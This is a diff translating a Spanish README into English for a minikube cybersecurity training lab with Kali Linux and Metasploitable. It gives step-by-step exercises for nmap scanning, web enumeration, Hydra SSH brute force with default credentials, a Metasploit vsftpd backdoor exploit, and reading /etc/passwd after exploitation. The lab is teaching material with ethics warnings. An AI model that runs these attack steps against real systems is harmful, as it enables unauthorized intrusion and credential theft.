@@ -664,271 +664,271 @@ minikube service list -n cyber-lab
    - In browser: `http://MINIKUBE_IP:31002`
    - You should see the Metasploitable web page
 
-## Ejemplos de Uso Educativo
+## Educational Usage Examples
 
-### Ejercicio 1: Reconocimiento Básico (Nivel Principiante)
+### Exercise 1: Basic Reconnaissance (Beginner Level)
 
-**Objetivo**: Aprender a descubrir sistemas en la red
+**Objective**: Learn to discover systems on the network
 
-**Pasos detallados**:
+**Detailed steps**:
 
-1. **Accede a Kali Linux**:
-   - Abre `http://IP_MINIKUBE:31000` en tu navegador
-   - Verás el escritorio XFCE4
+1. **Access Kali Linux**:
+   - Open `http://MINIKUBE_IP:31000` in your browser
+   - You'll see the XFCE4 desktop
 
-2. **Abre una terminal**:
-   - Clic en el icono de terminal en la barra inferior
-   - O usa el menú: Aplicaciones → Terminal
+2. **Open a terminal**:
+   - Click the terminal icon in the bottom bar
+   - Or use the menu: Applications → Terminal
 
-3. **Descubre la red**:
+3. **Discover the network**:
    ```bash
-   # Primero, encuentra tu propia IP
+   # First, find your own IP
    ip addr show
    
-   # Busca todas las IPs en tu rango de red
+   # Search for all IPs in your network range
    nmap -sn 10.244.0.0/16
    ```
    
-   **¿Qué está pasando?**
-   - `ip addr show` muestra todas las interfaces de red
-   - `nmap -sn` hace un "ping sweep" para encontrar máquinas activas
-   - El rango 10.244.0.0/16 es típico de Kubernetes
+   **What's happening?**
+   - `ip addr show` displays all network interfaces
+   - `nmap -sn` does a "ping sweep" to find active machines
+   - The range 10.244.0.0/16 is typical for Kubernetes
 
-4. **Identifica Metasploitable**:
+4. **Identify Metasploitable**:
    ```bash
-   # Encuentra cuál IP es Metasploitable
-   nmap -sV IP_DE_METASPLOITABLE
+   # Find which IP is Metasploitable
+   nmap -sV METASPLOITABLE_IP
    ```
    
-   **¿Qué verás?**
-   - Puerto 22 (SSH) abierto
-   - Puerto 80 (HTTP) abierto
-   - Posiblemente muchos otros puertos
+   **What you'll see:**
+   - Port 22 (SSH) open
+   - Port 80 (HTTP) open
+   - Possibly many other ports
 
-### Ejercicio 2: Análisis de Servicios Web (Nivel Intermedio)
+### Exercise 2: Web Application Analysis (Intermediate Level)
 
-**Objetivo**: Explorar aplicaciones web vulnerables
+**Objective**: Explore vulnerable web applications
 
-1. **Accede al sitio web**:
-   - En Kali, abre Firefox
-   - Navega a `http://IP_METASPLOITABLE`
+1. **Access the website**:
+   - In Kali, open Firefox
+   - Navigate to `http://METASPLOITABLE_IP`
 
-2. **Enumera directorios**:
+2. **Enumerate directories**:
    ```bash
-   # Busca directorios ocultos
-   dirb http://IP_METASPLOITABLE
+   # Search for hidden directories
+   dirb http://METASPLOITABLE_IP
    
-   # O usa gobuster (más moderno)
-   gobuster dir -u http://IP_METASPLOITABLE -w /usr/share/wordlists/dirb/common.txt
+   # Or use gobuster (more modern)
+   gobuster dir -u http://METASPLOITABLE_IP -w /usr/share/wordlists/dirb/common.txt
    ```
 
-3. **Escanea vulnerabilidades web**:
+3. **Scan for web vulnerabilities**:
    ```bash
-   # Usa nikto para análisis de vulnerabilidades
-   nikto -h http://IP_METASPLOITABLE
+   # Use nikto for vulnerability analysis
+   nikto -h http://METASPLOITABLE_IP
    ```
 
-### Ejercicio 3: Ataque SSH (Nivel Intermedio)
+### Exercise 3: SSH Attack (Intermediate Level)
 
-**Objetivo**: Practicar ataques de fuerza bruta
+**Objective**: Practice brute force attacks
 
-⚠️ **IMPORTANTE**: Solo hazlo en este laboratorio controlado
+⚠️ **IMPORTANT**: Only do this in this controlled laboratory
 
-1. **Ataque manual**:
+1. **Manual attack**:
    ```bash
-   # Intenta login con credenciales comunes
-   ssh msfadmin@IP_METASPLOITABLE
-   # Contraseña: msfadmin
+   # Try login with common credentials
+   ssh msfadmin@METASPLOITABLE_IP
+   # Password: msfadmin
    ```
 
-2. **Ataque automatizado con Hydra**:
+2. **Automated attack with Hydra**:
    ```bash
-   # Crea un archivo con usuarios comunes
-   echo "admin\nroot\nmsfadmin\nuser" > usuarios.txt
+   # Create a file with common users
+   echo "admin\nroot\nmsfadmin\nuser" > users.txt
    
-   # Crea un archivo con contraseñas comunes
+   # Create a file with common passwords
    echo "admin\npassword\n123456\nmsfadmin\ntoor" > passwords.txt
    
-   # Ejecuta el ataque
-   hydra -L usuarios.txt -P passwords.txt ssh://IP_METASPLOITABLE
+   # Execute the attack
+   hydra -L users.txt -P passwords.txt ssh://METASPLOITABLE_IP
    ```
 
-3. **Usando Metasploit**:
+3. **Using Metasploit**:
    ```bash
-   # Abre Metasploit
+   # Open Metasploit
    msfconsole
    
-   # Dentro de Metasploit:
+   # Inside Metasploit:
    use auxiliary/scanner/ssh/ssh_login
-   set RHOSTS IP_METASPLOITABLE
-   set USER_FILE usuarios.txt
+   set RHOSTS METASPLOITABLE_IP
+   set USER_FILE users.txt
    set PASS_FILE passwords.txt
    run
    ```
 
-### Ejercicio 4: Explotación con Metasploit (Nivel Avanzado)
+### Exercise 4: Exploitation with Metasploit (Advanced Level)
 
-**Objetivo**: Usar exploits reales contra vulnerabilidades
+**Objective**: Use real exploits against vulnerabilities
 
-1. **Buscar exploits disponibles**:
+1. **Search for available exploits**:
    ```bash
    msfconsole
    search type:exploit platform:linux
    ```
 
-2. **Usar un exploit específico**:
+2. **Use a specific exploit**:
    ```bash
-   # Ejemplo con vulnerabilidad VSFTPd
+   # Example with VSFTPd vulnerability
    use exploit/unix/ftp/vsftpd_234_backdoor
-   set RHOSTS IP_METASPLOITABLE
+   set RHOSTS METASPLOITABLE_IP
    exploit
    ```
 
-3. **Post-explotación**:
+3. **Post-exploitation**:
    ```bash
-   # Si obtienes una shell:
+   # If you get a shell:
    whoami
    uname -a
    cat /etc/passwd
    ```
 
-## Solución de Problemas Comunes
+## Common Troubleshooting
 
-### Problema 1: Los pods no inician
+### Problem 1: Pods don't start
 
-**Síntomas**:
+**Symptoms**:
 ```bash
 kubectl get pods -n cyber-lab
-# Estado: Pending o CrashLoopBackOff
+# Status: Pending or CrashLoopBackOff
 ```
 
-**Diagnóstico**:
+**Diagnosis**:
 ```bash
-# Ver eventos del pod
-kubectl describe pod NOMBRE_POD -n cyber-lab
+# See pod events
+kubectl describe pod POD_NAME -n cyber-lab
 
-# Ver logs del pod
-kubectl logs NOMBRE_POD -n cyber-lab
+# See pod logs
+kubectl logs POD_NAME -n cyber-lab
 ```
 
-**Soluciones comunes**:
-- **Recursos insuficientes**: Aumentar memoria/CPU de minikube
-- **Imágenes no encontradas**: Verificar conectividad a internet
-- **Permisos**: Verificar que Docker funciona sin sudo
+**Common solutions**:
+- **Insufficient resources**: Increase minikube memory/CPU
+- **Images not found**: Check internet connectivity
+- **Permissions**: Verify Docker works without sudo
 
-### Problema 2: No puedo acceder via web
+### Problem 2: Can't access via web
 
-**Síntomas**: Navegador no carga `http://IP:31000`
+**Symptoms**: Browser doesn't load `http://IP:31000`
 
-**Diagnóstico**:
+**Diagnosis**:
 ```bash
-# Verificar servicios
+# Check services
 kubectl get services -n cyber-lab
 
-# Verificar que minikube expone los puertos
+# Verify minikube exposes ports
 minikube service kali-service -n cyber-lab --url
 ```
 
-**Soluciones**:
-- Usar la URL exacta que da minikube
-- Verificar firewall local
-- Probar con port-forward: `kubectl port-forward -n cyber-lab svc/kali-service 8080:6080`
+**Solutions**:
+- Use the exact URL given by minikube
+- Check local firewall
+- Try port-forward: `kubectl port-forward -n cyber-lab svc/kali-service 8080:6080`
 
-### Problema 3: VNC no funciona
+### Problem 3: VNC doesn't work
 
-**Síntomas**: Pantalla negra o conexión rechazada
+**Symptoms**: Black screen or connection refused
 
-**Diagnóstico**:
+**Diagnosis**:
 ```bash
-# Ejecutar comandos dentro del pod Kali
-kubectl exec -it NOMBRE_POD_KALI -n cyber-lab -- bash
+# Run commands inside the Kali pod
+kubectl exec -it KALI_POD_NAME -n cyber-lab -- bash
 
-# Dentro del pod:
+# Inside the pod:
 ps aux | grep vnc
 ps aux | grep Xvfb
 cat /var/log/startup.log
 ```
 
-**Soluciones**:
-- Reiniciar el pod: `kubectl delete pod NOMBRE_POD_KALI -n cyber-lab`
-- Verificar logs de inicio
-- Comprobar que los puertos están libres
+**Solutions**:
+- Restart the pod: `kubectl delete pod KALI_POD_NAME -n cyber-lab`
+- Check startup logs
+- Verify ports are free
 
-### Problema 4: Metasploitable no responde
+### Problem 4: Metasploitable doesn't respond
 
-**Síntomas**: Servicios no accesibles desde Kali
+**Symptoms**: Services not accessible from Kali
 
-**Diagnóstico**:
+**Diagnosis**:
 ```bash
-# Desde Kali, probar conectividad
-kubectl exec -it NOMBRE_POD_KALI -n cyber-lab -- bash
-ping IP_METASPLOITABLE
-nmap IP_METASPLOITABLE
+# From Kali, test connectivity
+kubectl exec -it KALI_POD_NAME -n cyber-lab -- bash
+ping METASPLOITABLE_IP
+nmap METASPLOITABLE_IP
 ```
 
-**Soluciones**:
-- Verificar que ambos pods están en el mismo namespace
-- Comprobar políticas de red de Kubernetes
-- Reiniciar el pod Metasploitable
+**Solutions**:
+- Verify both pods are in the same namespace
+- Check Kubernetes network policies
+- Restart the Metasploitable pod
 
-## Consideraciones de Seguridad y Éticas
+## Security and Ethical Considerations
 
-### ¿Por qué es seguro este laboratorio?
+### Why is this laboratory safe?
 
-1. **Aislamiento por contenedores**: Todo está encapsulado en contenedores
-2. **Aislamiento por namespace**: Separado del resto del sistema
-3. **Red privada**: Solo accesible desde tu máquina local
-4. **Máquinas virtuales**: minikube corre en una VM separada
+1. **Container isolation**: Everything is encapsulated in containers
+2. **Namespace isolation**: Separated from the rest of the system
+3. **Private network**: Only accessible from your local machine
+4. **Virtual machines**: minikube runs in a separate VM
 
-### Reglas éticas fundamentales
+### Fundamental ethical rules
 
-1. **Solo para educación**: Nunca uses estas técnicas contra sistemas reales sin autorización
-2. **Entorno controlado**: Mantén siempre el laboratorio aislado
-3. **Responsabilidad**: Si encuentras vulnerabilidades reales, repórtalas responsablemente
-4. **Legalidad**: Asegúrate de cumplir las leyes locales sobre ciberseguridad
+1. **Education only**: Never use these techniques against real systems without authorization
+2. **Controlled environment**: Always keep the laboratory isolated
+3. **Responsibility**: If you find real vulnerabilities, report them responsibly
+4. **Legality**: Make sure to comply with local cybersecurity laws
 
-### Mejores prácticas
+### Best practices
 
-1. **Actualizaciones regulares**: Mantén las imágenes actualizadas
-2. **Logs y monitorización**: Revisa logs regularmente para aprender
-3. **Limpieza**: Elimina el laboratorio cuando no lo uses
-4. **Documentación**: Documenta tus experimentos y hallazgos
+1. **Regular updates**: Keep images updated
+2. **Logs and monitoring**: Review logs regularly to learn
+3. **Cleanup**: Remove the laboratory when not in use
+4. **Documentation**: Document your experiments and findings
 
-## Limpieza y Mantenimiento
+## Cleanup and Maintenance
 
-### Eliminar el laboratorio completamente
+### Completely remove the laboratory
 
 ```bash
-# Eliminar todos los recursos
+# Delete all resources
 kubectl delete namespace cyber-lab
 
-# Detener minikube
+# Stop minikube
 minikube stop
 
-# Eliminar minikube (opcional)
+# Delete minikube (optional)
 minikube delete
 ```
 
-### Reiniciar solo los pods
+### Restart only the pods
 
 ```bash
-# Reiniciar Kali
+# Restart Kali
 kubectl delete pod -l app=kali -n cyber-lab
 
-# Reiniciar Metasploitable
+# Restart Metasploitable
 kubectl delete pod -l app=metasploitable -n cyber-lab
 ```
 
-### Actualizar imágenes
+### Update images
 
 ```bash
-# Forzar descarga de nuevas imágenes
+# Force download of new images
 kubectl rollout restart deployment/kali -n cyber-lab
 kubectl rollout restart deployment/metasploitable -n cyber-lab
 ```
 
 ---
 
-**Recuerda**: El conocimiento adquirido en este laboratorio debe usarse para mejorar la seguridad, no para causar daño. Siempre practica principios de hacking ético y respeta los límites legales.
+**Remember**: The knowledge acquired in this laboratory should be used to improve security, not to cause harm. Always practice ethical hacking principles and respect legal boundaries.
 
-**¡Bienvenido al fascinante mundo de la ciberseguridad!** 🛡️💻
+**Welcome to the fascinating world of cybersecurity!** 🛡️💻
